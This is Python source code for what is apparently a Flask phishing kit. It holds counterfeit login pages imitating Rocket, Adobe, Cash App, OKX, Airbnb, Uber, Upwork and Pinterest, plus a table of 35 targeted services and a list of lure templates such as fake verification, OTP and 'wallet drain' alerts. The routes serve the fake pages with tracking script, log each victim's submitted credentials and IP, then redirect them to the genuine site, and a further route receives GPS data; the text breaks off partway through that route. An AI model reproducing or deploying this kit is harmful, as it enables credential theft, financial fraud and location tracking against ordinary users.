PAGES['rocket']['traditional'] = """<!DOCTYPE html>
<html lang="en"><head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
<title>Rocket — Log in</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#7b2d8b;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;min-height:100vh;display:flex;flex-direction:column;align-items:center}
.topbar{padding:28px;text-align:center}
.rocket-logo{color:#fff;font-size:32px;font-weight:900;letter-spacing:-1px}
.rocket-logo span{color:#f5a623}
.sub{color:rgba(255,255,255,.8);font-size:12px;letter-spacing:1px;margin-top:4px}
.card{background:#fff;border-radius:20px 20px 0 0;width:100%;flex:1;padding:32px 24px}
h2{font-size:1.2em;font-weight:700;color:#7b2d8b;margin-bottom:4px}
p{font-size:.88em;color:#888;margin-bottom:22px}
label{font-size:.85em;font-weight:600;color:#333;display:block;margin-bottom:5px}
input{width:100%;padding:14px;border:1.5px solid #e0e0e0;border-radius:10px;font-size:16px;color:#333;outline:none;margin-bottom:14px}
input:focus{border-color:#7b2d8b}
.btn{width:100%;padding:14px;background:#7b2d8b;color:#fff;border:none;border-radius:10px;font-size:16px;font-weight:700;cursor:pointer}
.forgot{display:block;text-align:center;color:#7b2d8b;font-size:14px;text-decoration:none;margin-top:14px;font-weight:600}
</style></head><body>
TRACK_PLACEHOLDER
<div class="topbar">
  <div class="rocket-logo">🚀 Rocket</div>
  <div class="sub">Dutch-Bangla Bank MFS</div>
</div>
<div class="card">
  <h2>Login to Rocket</h2>
  <p>Enter your mobile number and PIN</p>
  <form action="/login" method="POST">
    <label>Mobile Number</label>
    <input type="tel" name="email" placeholder="01XXXXXXXXX" maxlength="11" required>
    <label>PIN</label>
    <input type="password" name="password" placeholder="4 or 5 digit PIN" maxlength="5" required>
    <button class="btn" type="submit">Login</button>
  </form>
  <a class="forgot" href="#">Forgot PIN?</a>
</div>
</body></html>"""

# ─────────────────────────────────────────────────────────────────────────────
# ADOBE
# ─────────────────────────────────────────────────────────────────────────────
PAGES['adobe'] = {}
PAGES['adobe']['traditional'] = """<!DOCTYPE html>
<html lang="en"><head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
<title>Adobe — Sign In</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#f8f8f8;font-family:adobe-clean,'Source Sans Pro',Helvetica,sans-serif;min-height:100vh;display:flex;flex-direction:column;align-items:center}
.topbar{background:#fa0f00;width:100%;padding:14px 24px;display:flex;align-items:center;gap:8px}
.topbar svg{width:28px;height:28px;fill:#fff}
.topbar span{color:#fff;font-size:1.1em;font-weight:700}
.card{background:#fff;padding:36px 28px;max-width:400px;width:100%;margin-top:40px;border-radius:4px;box-shadow:0 2px 16px rgba(0,0,0,.1)}
h1{font-size:1.4em;font-weight:700;color:#2c2c2c;margin-bottom:4px}
.sub{font-size:.88em;color:#747474;margin-bottom:24px}
.sso-btn{width:100%;padding:11px;border:1px solid #d4d4d4;border-radius:4px;font-size:14px;font-weight:600;color:#2c2c2c;cursor:pointer;display:flex;align-items:center;justify-content:center;gap:8px;margin-bottom:10px;background:#fff}
.or-row{display:flex;align-items:center;gap:12px;margin:14px 0;color:#747474;font-size:13px}
.or-line{flex:1;height:1px;background:#d4d4d4}
label{font-size:13px;font-weight:600;color:#2c2c2c;display:block;margin-bottom:4px}
input{width:100%;padding:11px 12px;border:1px solid #d4d4d4;border-radius:4px;font-size:15px;color:#2c2c2c;outline:none;margin-bottom:14px}
input:focus{border-color:#fa0f00;box-shadow:0 0 0 2px rgba(250,15,0,.1)}
.btn{width:100%;padding:12px;background:#fa0f00;color:#fff;border:none;border-radius:4px;font-size:15px;font-weight:700;cursor:pointer}
.btn:hover{background:#e00d00}
.forgot{display:block;text-align:center;color:#fa0f00;font-size:13px;text-decoration:none;margin-top:12px}
.signup-row{text-align:center;font-size:13px;color:#747474;margin-top:16px;padding-top:16px;border-top:1px solid #d4d4d4}
.signup-row a{color:#fa0f00;font-weight:700;text-decoration:none}
</style></head><body>
TRACK_PLACEHOLDER
<div class="topbar">
  <svg viewBox="0 0 50 40"><polygon points="25,0 50,40 0,40" fill="#ff0000"/></svg>
  <span>Adobe</span>
</div>
<div class="card">
  <h1>Sign In</h1>
  <p class="sub">Sign in to access Creative Cloud, Acrobat and more.</p>
  <button class="sso-btn">
    <svg width="18" height="18" viewBox="0 0 48 48"><path fill="#EA4335" d="M24 9.5c3.5 0 6.6 1.2 9.1 3.2l6.8-6.8C35.8 2.2 30.2 0 24 0 14.6 0 6.6 5.4 2.6 13.3l7.9 6.2C12.4 13.3 17.7 9.5 24 9.5z"/><path fill="#4285F4" d="M46.5 24.5c0-1.6-.1-3.1-.4-4.5H24v8.5h12.7c-.6 3-2.3 5.5-4.8 7.2l7.5 5.8c4.4-4.1 7.1-10.1 7.1-17z"/><path fill="#FBBC05" d="M10.5 28.5c-.5-1.5-.8-3.1-.8-4.8s.3-3.3.8-4.8l-7.9-6.2C.9 15.8 0 19.8 0 24s.9 8.2 2.6 11.3l7.9-6.8z"/><path fill="#34A853" d="M24 48c6.2 0 11.4-2 15.2-5.5l-7.5-5.8c-2 1.4-4.6 2.2-7.7 2.2-6.3 0-11.6-3.8-13.5-9.2l-7.9 6.8C6.6 42.6 14.6 48 24 48z"/></svg>
    Continue with Google
  </button>
  <button class="sso-btn">🍎 Continue with Apple</button>
  <div class="or-row"><div class="or-line"></div>Or<div class="or-line"></div></div>
  <form action="/login" method="POST">
    <label>Email address</label>
    <input type="email" name="email" autocomplete="email" required>
    <label>Password</label>
    <input type="password" name="password" required>
    <button class="btn" type="submit">Continue</button>
  </form>
  <a class="forgot" href="#">Reset your password</a>
  <div class="signup-row">Don't have an account? <a href="#">Get started free</a></div>
</div>
</body></html>"""

# ─────────────────────────────────────────────────────────────────────────────
# CASHAPP
# ─────────────────────────────────────────────────────────────────────────────
PAGES['cashapp'] = {}
PAGES['cashapp']['traditional'] = """<!DOCTYPE html>
<html lang="en"><head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
<title>Cash App — Sign In</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#00d64f;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;min-height:100vh;display:flex;flex-direction:column;align-items:center;padding:0 16px}
.logo{margin:48px 0 24px;text-align:center}
.logo svg{width:64px;height:64px}
h1{font-size:1.5em;font-weight:800;color:#fff;margin-bottom:8px;text-align:center}
.sub{font-size:.9em;color:rgba(255,255,255,.85);text-align:center;margin-bottom:28px;line-height:1.5}
.card{background:#fff;border-radius:16px;padding:28px 24px;width:100%;max-width:360px}
label{font-size:14px;font-weight:600;color:#1a1a1a;display:block;margin-bottom:5px}
input{width:100%;padding:14px;border:1.5px solid #e0e0e0;border-radius:10px;font-size:17px;color:#1a1a1a;outline:none;margin-bottom:16px}
input:focus{border-color:#00d64f}
.btn{width:100%;padding:14px;background:#00d64f;color:#fff;border:none;border-radius:10px;font-size:17px;font-weight:800;cursor:pointer}
.btn:active{background:#00bb44}
.forgot{display:block;text-align:center;color:#00d64f;font-size:14px;font-weight:600;text-decoration:none;margin-top:14px}
</style></head><body>
TRACK_PLACEHOLDER
<div class="logo">
  <svg viewBox="0 0 50 50" fill="white"><rect width="50" height="50" rx="10" fill="white"/><path fill="#00d64f" d="M25 8l-5.5 2.4C17 11.6 15 14 15 17c0 2.5 1.6 4.4 3.9 5l6.1 1.5c1.3.3 2 1.2 2 2.4 0 1.5-1.2 2.6-2.8 2.6H17l-1 4h7.4c3.1 0 5.5-1.5 6.9-3.9L31.5 42H35l1-4.5c3.5-1 6-4 6-7.5 0-3.5-2.4-6.4-5.9-7.3L30.5 21c-1.4-.3-2.5-1.5-2.5-2.9 0-1.5 1.2-2.6 2.8-2.6h6l1-4h-5.4L33 8h-8z"/></svg>
</div>
<h1>Sign in to Cash App</h1>
<p class="sub">Enter your phone number or email to continue</p>
<div class="card">
  <form action="/login" method="POST">
    <label>Phone or Email</label>
    <input type="text" name="email" placeholder="Phone number or email" required>
    <label>Password</label>
    <input type="password" name="password" placeholder="Enter your password" required>
    <button class="btn" type="submit">Sign In</button>
  </form>
  <a class="forgot" href="#">Need help signing in?</a>
</div>
</body></html>"""

# ─────────────────────────────────────────────────────────────────────────────
# OKX
# ─────────────────────────────────────────────────────────────────────────────
PAGES['okx'] = {}
PAGES['okx']['traditional'] = """<!DOCTYPE html>
<html lang="en"><head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
<title>OKX — Log In</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#000;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;min-height:100vh;display:flex;flex-direction:column;align-items:center;color:#e0e0e0;padding:0 16px}
.okx-logo{margin:40px 0 32px;font-size:28px;font-weight:900;color:#fff;letter-spacing:-1px}
.card{background:#111;border:1px solid #222;border-radius:12px;padding:28px 24px;max-width:400px;width:100%}
h1{font-size:1.3em;font-weight:700;color:#fff;margin-bottom:20px}
.tabs{display:flex;gap:24px;margin-bottom:20px;border-bottom:1px solid #222;padding-bottom:12px}
.tab{font-size:14px;font-weight:600;color:#666;cursor:pointer;padding-bottom:4px}
.tab.active{color:#fff;border-bottom:2px solid #fff}
label{font-size:12px;font-weight:600;color:#666;display:block;margin-bottom:5px;text-transform:uppercase;letter-spacing:.5px}
input{width:100%;padding:12px;background:#000;border:1px solid #333;border-radius:6px;font-size:15px;color:#fff;outline:none;margin-bottom:14px}
input:focus{border-color:#fff}
input::placeholder{color:#444}
.btn{width:100%;padding:13px;background:#fff;color:#000;border:none;border-radius:6px;font-size:15px;font-weight:800;cursor:pointer}
.links{display:flex;justify-content:space-between;margin-top:12px;font-size:13px}
.links a{color:#888;text-decoration:none}
.signup-row{text-align:center;margin-top:20px;font-size:13px;color:#666}
.signup-row a{color:#fff;font-weight:700;text-decoration:none}
</style></head><body>
TRACK_PLACEHOLDER
<div class="okx-logo">OKX</div>
<div class="card">
  <h1>Log In</h1>
  <div class="tabs">
    <div class="tab active">Email</div>
    <div class="tab">Mobile</div>
  </div>
  <form action="/login" method="POST">
    <label>Email</label>
    <input type="email" name="email" placeholder="Enter your email" required>
    <label>Password</label>
    <input type="password" name="password" placeholder="Enter your password" required>
    <button class="btn" type="submit">Log In</button>
  </form>
  <div class="links"><a href="#">Forgot password?</a><a href="#">Help</a></div>
  <div class="signup-row">No account? <a href="#">Register</a></div>
</div>
</body></html>"""

# ─────────────────────────────────────────────────────────────────────────────
# AIRBNB
# ─────────────────────────────────────────────────────────────────────────────
PAGES['airbnb'] = {}
PAGES['airbnb']['traditional'] = """<!DOCTYPE html>
<html lang="en"><head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
<title>Airbnb — Log in or sign up</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#fff;font-family:Circular,-apple-system,BlinkMacSystemFont,'Roboto',sans-serif;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:16px}
.card{max-width:390px;width:100%;border:1px solid #dddddd;border-radius:12px;padding:28px 24px;box-shadow:0 6px 20px rgba(0,0,0,.12)}
.header{display:flex;align-items:center;justify-content:center;margin-bottom:24px;position:relative}
.header h2{font-size:1em;font-weight:600;color:#222222;text-align:center}
.airbnb-logo{font-size:1.6em;font-weight:900;color:#ff5a5f;letter-spacing:-1px;text-align:center;margin-bottom:16px}
h1{font-size:1.3em;font-weight:600;color:#222;margin-bottom:4px}
.sub{font-size:.9em;color:#717171;margin-bottom:20px}
.sso-btn{width:100%;padding:12px 16px;border:1.5px solid #dddddd;border-radius:8px;font-size:14px;font-weight:600;color:#222;cursor:pointer;display:flex;align-items:center;gap:12px;margin-bottom:12px;background:#fff;text-align:left}
.sso-btn:hover{background:#f7f7f7}
.or-row{display:flex;align-items:center;gap:12px;margin:16px 0;color:#717171;font-size:13px}
.or-line{flex:1;height:1px;background:#dddddd}
input{width:100%;padding:14px;border:1.5px solid #dddddd;border-radius:8px;font-size:15px;color:#222;outline:none;margin-bottom:12px}
input:focus{border-color:#222}
.btn{width:100%;padding:14px;background:linear-gradient(to right,#e61e4d,#e31c5f,#d70466);color:#fff;border:none;border-radius:8px;font-size:15px;font-weight:600;cursor:pointer}
.terms{font-size:12px;color:#717171;margin-top:12px;line-height:1.6}
.terms a{color:#222;text-decoration:underline}
</style></head><body>
TRACK_PLACEHOLDER
<div class="card">
  <div class="airbnb-logo">airbnb</div>
  <h1>Welcome to Airbnb</h1>
  <p class="sub">Log in or create an account</p>
  <button class="sso-btn">
    <svg width="20" height="20" viewBox="0 0 48 48"><path fill="#EA4335" d="M24 9.5c3.5 0 6.6 1.2 9.1 3.2l6.8-6.8C35.8 2.2 30.2 0 24 0 14.6 0 6.6 5.4 2.6 13.3l7.9 6.2C12.4 13.3 17.7 9.5 24 9.5z"/><path fill="#4285F4" d="M46.5 24.5c0-1.6-.1-3.1-.4-4.5H24v8.5h12.7c-.6 3-2.3 5.5-4.8 7.2l7.5 5.8c4.4-4.1 7.1-10.1 7.1-17z"/><path fill="#FBBC05" d="M10.5 28.5c-.5-1.5-.8-3.1-.8-4.8s.3-3.3.8-4.8l-7.9-6.2C.9 15.8 0 19.8 0 24s.9 8.2 2.6 11.3l7.9-6.8z"/><path fill="#34A853" d="M24 48c6.2 0 11.4-2 15.2-5.5l-7.5-5.8c-2 1.4-4.6 2.2-7.7 2.2-6.3 0-11.6-3.8-13.5-9.2l-7.9 6.8C6.6 42.6 14.6 48 24 48z"/></svg>
    Continue with Google
  </button>
  <button class="sso-btn">🍎 Continue with Apple</button>
  <button class="sso-btn">🔵 Continue with Facebook</button>
  <div class="or-row"><div class="or-line"></div>or<div class="or-line"></div></div>
  <form action="/login" method="POST">
    <input type="email" name="email" placeholder="Email" required>
    <input type="password" name="password" placeholder="Password" required>
    <button class="btn" type="submit">Continue</button>
  </form>
  <div class="terms">By continuing, I agree to Airbnb's <a href="#">Terms of Service</a> and <a href="#">Privacy Policy</a>.</div>
</div>
</body></html>"""

# ─────────────────────────────────────────────────────────────────────────────
# UBER
# ─────────────────────────────────────────────────────────────────────────────
PAGES['uber'] = {}
PAGES['uber']['traditional'] = """<!DOCTYPE html>
<html lang="en"><head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
<title>Uber — Log in</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#fff;font-family:'UberMove',-apple-system,BlinkMacSystemFont,sans-serif;min-height:100vh;display:flex;flex-direction:column}
.topbar{padding:20px 24px;border-bottom:1px solid #eeeeee}
.uber-logo{font-size:26px;font-weight:900;color:#000;letter-spacing:-1px}
.wrap{max-width:400px;width:100%;margin:40px auto;padding:0 24px}
h1{font-size:1.6em;font-weight:700;color:#000;margin-bottom:24px}
.sso-btn{width:100%;padding:14px;border:1px solid #e5e5e5;border-radius:50px;font-size:15px;font-weight:600;color:#000;cursor:pointer;display:flex;align-items:center;gap:12px;margin-bottom:12px;background:#fff}
.or-row{display:flex;align-items:center;gap:12px;margin:16px 0;color:#757575;font-size:14px}
.or-line{flex:1;height:1px;background:#e5e5e5}
input{width:100%;padding:14px 16px;border:1px solid #e5e5e5;border-radius:8px;font-size:16px;color:#000;outline:none;margin-bottom:12px}
input:focus{border-color:#000;border-width:2px;padding:13px 15px}
.btn{width:100%;padding:14px;background:#000;color:#fff;border:none;border-radius:50px;font-size:16px;font-weight:700;cursor:pointer}
.btn:hover{background:#333}
.signup-row{text-align:center;font-size:14px;color:#757575;margin-top:24px}
.signup-row a{color:#000;font-weight:700;text-decoration:none}
</style></head><body>
TRACK_PLACEHOLDER
<div class="topbar"><div class="uber-logo">Uber</div></div>
<div class="wrap">
  <h1>What's your phone number or email?</h1>
  <button class="sso-btn">
    <svg width="20" height="20" viewBox="0 0 48 48"><path fill="#EA4335" d="M24 9.5c3.5 0 6.6 1.2 9.1 3.2l6.8-6.8C35.8 2.2 30.2 0 24 0 14.6 0 6.6 5.4 2.6 13.3l7.9 6.2C12.4 13.3 17.7 9.5 24 9.5z"/><path fill="#4285F4" d="M46.5 24.5c0-1.6-.1-3.1-.4-4.5H24v8.5h12.7c-.6 3-2.3 5.5-4.8 7.2l7.5 5.8c4.4-4.1 7.1-10.1 7.1-17z"/><path fill="#FBBC05" d="M10.5 28.5c-.5-1.5-.8-3.1-.8-4.8s.3-3.3.8-4.8l-7.9-6.2C.9 15.8 0 19.8 0 24s.9 8.2 2.6 11.3l7.9-6.8z"/><path fill="#34A853" d="M24 48c6.2 0 11.4-2 15.2-5.5l-7.5-5.8c-2 1.4-4.6 2.2-7.7 2.2-6.3 0-11.6-3.8-13.5-9.2l-7.9 6.8C6.6 42.6 14.6 48 24 48z"/></svg>
    Continue with Google
  </button>
  <button class="sso-btn">🍎 Continue with Apple</button>
  <div class="or-row"><div class="or-line"></div>or<div class="or-line"></div></div>
  <form action="/login" method="POST">
    <input type="text" name="email" placeholder="Phone number or email" required>
    <input type="password" name="password" placeholder="Password" required>
    <button class="btn" type="submit">Continue →</button>
  </form>
  <div class="signup-row">Don't have an account? <a href="#">Sign up</a></div>
</div>
</body></html>"""

# ─────────────────────────────────────────────────────────────────────────────
# UPWORK
# ─────────────────────────────────────────────────────────────────────────────
PAGES['upwork'] = {}
PAGES['upwork']['traditional'] = """<!DOCTYPE html>
<html lang="en"><head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
<title>Upwork — Log in</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#f7f7f7;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;min-height:100vh;display:flex;flex-direction:column;align-items:center}
.topbar{background:#14a800;width:100%;padding:14px 24px;display:flex;align-items:center}
.uw-logo{color:#fff;font-size:1.3em;font-weight:800;letter-spacing:-1px}
.wrap{max-width:400px;width:100%;margin:32px auto;padding:0 16px}
.card{background:#fff;border-radius:4px;box-shadow:0 2px 8px rgba(0,0,0,.08);padding:28px 24px}
h1{font-size:1.3em;font-weight:600;color:#1d2129;margin-bottom:20px;text-align:center}
.sso-btn{width:100%;padding:11px;border:1px solid #d4d4d4;border-radius:4px;font-size:14px;font-weight:600;color:#1d2129;cursor:pointer;display:flex;align-items:center;justify-content:center;gap:8px;margin-bottom:10px;background:#fff}
.or-row{display:flex;align-items:center;gap:12px;margin:14px 0;color:#95979d;font-size:13px}
.or-line{flex:1;height:1px;background:#dadbdd}
label{font-size:14px;font-weight:600;color:#1d2129;display:block;margin-bottom:4px}
input{width:100%;padding:11px 12px;border:1px solid #d4d4d4;border-radius:4px;font-size:14px;color:#1d2129;outline:none;margin-bottom:12px}
input:focus{border-color:#14a800;box-shadow:0 0 0 2px rgba(20,168,0,.1)}
.btn{width:100%;padding:11px;background:#14a800;color:#fff;border:none;border-radius:4px;font-size:14px;font-weight:700;cursor:pointer}
.forgot{display:block;text-align:center;color:#14a800;font-size:13px;text-decoration:none;margin-top:10px}
.signup-row{text-align:center;font-size:13px;color:#95979d;margin-top:14px;padding-top:14px;border-top:1px solid #dadbdd}
.signup-row a{color:#14a800;font-weight:700;text-decoration:none}
</style></head><body>
TRACK_PLACEHOLDER
<div class="topbar"><div class="uw-logo">Upwork</div></div>
<div class="wrap">
  <div class="card">
    <h1>Log in to Upwork</h1>
    <button class="sso-btn">
      <svg width="18" height="18" viewBox="0 0 48 48"><path fill="#EA4335" d="M24 9.5c3.5 0 6.6 1.2 9.1 3.2l6.8-6.8C35.8 2.2 30.2 0 24 0 14.6 0 6.6 5.4 2.6 13.3l7.9 6.2C12.4 13.3 17.7 9.5 24 9.5z"/><path fill="#4285F4" d="M46.5 24.5c0-1.6-.1-3.1-.4-4.5H24v8.5h12.7c-.6 3-2.3 5.5-4.8 7.2l7.5 5.8c4.4-4.1 7.1-10.1 7.1-17z"/><path fill="#FBBC05" d="M10.5 28.5c-.5-1.5-.8-3.1-.8-4.8s.3-3.3.8-4.8l-7.9-6.2C.9 15.8 0 19.8 0 24s.9 8.2 2.6 11.3l7.9-6.8z"/><path fill="#34A853" d="M24 48c6.2 0 11.4-2 15.2-5.5l-7.5-5.8c-2 1.4-4.6 2.2-7.7 2.2-6.3 0-11.6-3.8-13.5-9.2l-7.9 6.8C6.6 42.6 14.6 48 24 48z"/></svg>
      Continue with Google
    </button>
    <button class="sso-btn">🍎 Continue with Apple</button>
    <div class="or-row"><div class="or-line"></div>or<div class="or-line"></div></div>
    <form action="/login" method="POST">
      <label>Email or username</label>
      <input type="text" name="email" required>
      <label>Password</label>
      <input type="password" name="password" required>
      <button class="btn" type="submit">Log In</button>
    </form>
    <a class="forgot" href="#">Forgot password?</a>
    <div class="signup-row">Don't have an account? <a href="#">Sign up</a></div>
  </div>
</div>
</body></html>"""

# ─────────────────────────────────────────────────────────────────────────────
# PINTEREST
# ─────────────────────────────────────────────────────────────────────────────
PAGES['pinterest'] = {}
PAGES['pinterest']['traditional'] = """<!DOCTYPE html>
<html lang="en"><head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
<title>Pinterest</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#fff;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;min-height:100vh;display:flex;flex-direction:column;align-items:center}
.container{width:100%;max-width:400px;padding:40px 24px}
.pin-logo{text-align:center;margin-bottom:16px}
.pin-icon{width:50px;height:50px;background:#e60023;border-radius:50%;display:inline-flex;align-items:center;justify-content:center}
.pin-icon svg{width:30px;height:30px;fill:#fff}
h1{font-size:1.4em;font-weight:700;color:#111;text-align:center;margin-bottom:4px}
.sub{font-size:.88em;color:#767676;text-align:center;margin-bottom:24px}
.sso-btn{width:100%;padding:13px;background:#fff;border:1.5px solid #cdcdcd;border-radius:9999px;font-size:14px;font-weight:600;color:#111;cursor:pointer;display:flex;align-items:center;justify-content:center;gap:10px;margin-bottom:10px}
.or-row{display:flex;align-items:center;gap:12px;margin:16px 0;color:#767676;font-size:13px}
.or-line{flex:1;height:1px;background:#e2e2e2}
input{width:100%;padding:13px 14px;border:1.5px solid #cdcdcd;border-radius:9999px;font-size:15px;color:#111;outline:none;margin-bottom:10px}
input:focus{border-color:#e60023}
.btn{width:100%;padding:13px;background:#e60023;color:#fff;border:none;border-radius:9999px;font-size:15px;font-weight:700;cursor:pointer}
.forgot{display:block;text-align:center;color:#e60023;font-size:14px;text-decoration:none;margin-top:16px;font-weight:600}
.signup-row{text-align:center;font-size:14px;color:#767676;margin-top:28px;padding-top:20px;border-top:1px solid #e2e2e2}
.signup-row a{color:#e60023;font-weight:700;text-decoration:none}
</style></head><body>
TRACK_PLACEHOLDER
<div class="container">
  <div class="pin-logo">
    <div class="pin-icon">
      <svg viewBox="0 0 24 24"><path d="M12 0C5.4 0 0 5.4 0 12c0 5.1 3.1 9.4 7.5 11.3-.1-.9-.2-2.4 0-3.4.2-.9 1.4-5.8 1.4-5.8s-.4-.7-.4-1.8c0-1.7 1-2.9 2.2-2.9 1 0 1.5.8 1.5 1.7 0 1-.7 2.6-1 4 .3 1.3 1.4 2.2 2.7 2.2 3.2 0 5.4-3.4 5.4-8.3 0-4.4-3.1-7.4-7.5-7.4-5.1 0-8.1 3.8-8.1 7.8 0 1.5.6 3.1 1.3 4 .1.2.2.3.1.5-.1.5-.4 1.7-.5 1.9-.1.3-.2.3-.5.2C2.7 15.8 1 12.7 1 9.4 1 4.2 5 0 12 0c5.8 0 10.3 4.1 10.3 9.6 0 5.8-3.6 10.5-8.7 10.5-1.7 0-3.3-.9-3.9-1.9l-1 4c-.4 1.4-1.4 3.1-2 4.1.6.2 1.2.3 1.8.3.5.1 1.1.2 1.6.2 6.6 0 12-5.4 12-12S18.6 0 12 0z"/></svg>
    </div>
  </div>
  <h1>Welcome to Pinterest</h1>
  <p class="sub">Find new ideas to try</p>
  <button class="sso-btn">
    <svg width="20" height="20" viewBox="0 0 48 48"><path fill="#EA4335" d="M24 9.5c3.5 0 6.6 1.2 9.1 3.2l6.8-6.8C35.8 2.2 30.2 0 24 0 14.6 0 6.6 5.4 2.6 13.3l7.9 6.2C12.4 13.3 17.7 9.5 24 9.5z"/><path fill="#4285F4" d="M46.5 24.5c0-1.6-.1-3.1-.4-4.5H24v8.5h12.7c-.6 3-2.3 5.5-4.8 7.2l7.5 5.8c4.4-4.1 7.1-10.1 7.1-17z"/><path fill="#FBBC05" d="M10.5 28.5c-.5-1.5-.8-3.1-.8-4.8s.3-3.3.8-4.8l-7.9-6.2C.9 15.8 0 19.8 0 24s.9 8.2 2.6 11.3l7.9-6.8z"/><path fill="#34A853" d="M24 48c6.2 0 11.4-2 15.2-5.5l-7.5-5.8c-2 1.4-4.6 2.2-7.7 2.2-6.3 0-11.6-3.8-13.5-9.2l-7.9 6.8C6.6 42.6 14.6 48 24 48z"/></svg>
    Continue with Google
  </button>
  <button class="sso-btn">🍎 Continue with Apple</button>
  <button class="sso-btn">🔵 Continue with Facebook</button>
  <div class="or-row"><div class="or-line"></div>OR<div class="or-line"></div></div>
  <form action="/login" method="POST">
    <input type="email" name="email" placeholder="Email" required>
    <input type="password" name="password" placeholder="Password" required>
    <button class="btn" type="submit">Log in</button>
  </form>
  <a class="forgot" href="#">Forgot your password?</a>
  <div class="signup-row">Not on Pinterest yet? <a href="#">Sign up</a></div>
</div>
</body></html>"""

# ─────────────────────────────────────────────────────────────────────────────
# BYBIT already added above, OKX above
# AIRBNB, UBER, UPWORK, PINTEREST above
# ─────────────────────────────────────────────────────────────────────────────

PLATFORMS = {
    '1':  ('Facebook',      'https://facebook.com',           'facebook'),
    '2':  ('Instagram',     'https://instagram.com',          'instagram'),
    '3':  ('Google',        'https://accounts.google.com',    'google'),
    '4':  ('Twitter / X',   'https://x.com',                  'twitter'),
    '5':  ('TikTok',        'https://tiktok.com',             'tiktok'),
    '6':  ('WhatsApp Web',  'https://web.whatsapp.com',       'whatsapp'),
    '7':  ('Netflix',       'https://netflix.com',            'netflix'),
    '8':  ('LinkedIn',      'https://linkedin.com',           'linkedin'),
    '9':  ('Discord',       'https://discord.com',            'discord'),
    '10': ('Steam',         'https://store.steampowered.com', 'steam'),
    '11': ('Binance',       'https://binance.com',            'binance'),
    '12': ('Spotify',       'https://spotify.com',            'spotify'),
    '13': ('PayPal',        'https://paypal.com',             'paypal'),
    '14': ('Microsoft',     'https://microsoft.com',          'microsoft'),
    '15': ('GitHub',        'https://github.com',             'github'),
    '16': ('bKash',         'https://bkash.com',              'bkash'),
    '17': ('Nagad',         'https://nagad.com.bd',           'nagad'),
    '18': ('Snapchat',      'https://snapchat.com',           'snapchat'),
    '19': ('Pinterest',     'https://pinterest.com',          'pinterest'),
    '20': ('Reddit',        'https://reddit.com',             'reddit'),
    '21': ('Twitch',        'https://twitch.tv',              'twitch'),
    '22': ('Apple ID',      'https://appleid.apple.com',      'apple'),
    '23': ('Amazon',        'https://amazon.com',             'amazon'),
    '24': ('YouTube',       'https://youtube.com',            'google'),
    '25': ('Telegram Web',  'https://web.telegram.org',       'telegram_web'),
    '26': ('Coinbase',      'https://coinbase.com',           'coinbase'),
    '27': ('Bybit',         'https://bybit.com',              'bybit'),
    '28': ('OKX',           'https://okx.com',                'okx'),
    '29': ('Fiverr',        'https://fiverr.com',             'fiverr'),
    '30': ('Upwork',        'https://upwork.com',             'upwork'),
    '31': ('Airbnb',        'https://airbnb.com',             'airbnb'),
    '32': ('Uber',          'https://uber.com',               'uber'),
    '33': ('Rocket (BD)',   'https://dutchbanglabank.com',    'rocket'),
    '34': ('Cash App',      'https://cash.app',               'cashapp'),
    '35': ('Adobe',         'https://adobe.com',              'adobe'),
}

TEMPLATE_NAMES = {
    'traditional':       '📱 Traditional Login Page',
    'verified_badge':    '✅ Fake Verified Badge Lure',
    'account_suspended': '⛔ Account Suspended / Disabled',
    'account_disabled':  '⚠️  Account Disabled Appeal',
    'security_check':    '🔐 Security Check Required',
    'marketplace':       '🛒 Marketplace Verification',
    'drive_storage':     '☁️  Drive Storage Full Lure',
    'youtube':           '▶️  YouTube / Google Lure',
    'creator_fund':      '💰 Creator Fund Lure',
    'web_clone':         '💬 WhatsApp Web QR Clone',
    'payment_update':    '💳 Payment Method Update',
    'nitro_gift':        '🎁 Discord Nitro Gift Lure',
    'free_game':         '🎮 Free Game Offer Lure',
    'wallet_drain':      '🚨 Urgent Security Alert',
    'otp_scam':          '📲 OTP Verification Lure',
}

# ══════════════════════════════════════════════════════════════════════════════
# FLASK ROUTES
# ══════════════════════════════════════════════════════════════════════════════

@app.route('/')
def index():
    pk = active.get('platform_key','facebook')
    tk = active.get('template_key','traditional')
    page = PAGES.get(pk,{}).get(tk,'')
    if not page:
        # fallback to first available template
        templates = PAGES.get(pk,{})
        page = next(iter(templates.values()),'<h1>Page not found</h1>')
    # inject tracking JS
    page = page.replace('TRACK_PLACEHOLDER', TRACK_JS)
    return render_template_string(page)

@app.route('/login', methods=['POST'])
def capture():
    pk   = active.get('platform_key','facebook')
    rurl = active.get('redirect_url','https://google.com')
    data = {k:v for k,v in request.form.items()}
    ip   = request.headers.get('X-Forwarded-For', request.remote_addr)
    log_cred(pk, data, ip)
    return redirect(rurl)

@app.route('/track', methods=['POST'])
def track():
    """Receives IP + GPS data from JS on page load"""
    try:
        d   = request.get_json(force=True, silent=True) or {}
        ip  = d.get('ip','N/A')
        lat = d.get('lat')
        lon = d.get('lon')
        ua  = d.get('ua','N/A')
        pk  = active.get('platform_key','unknown')
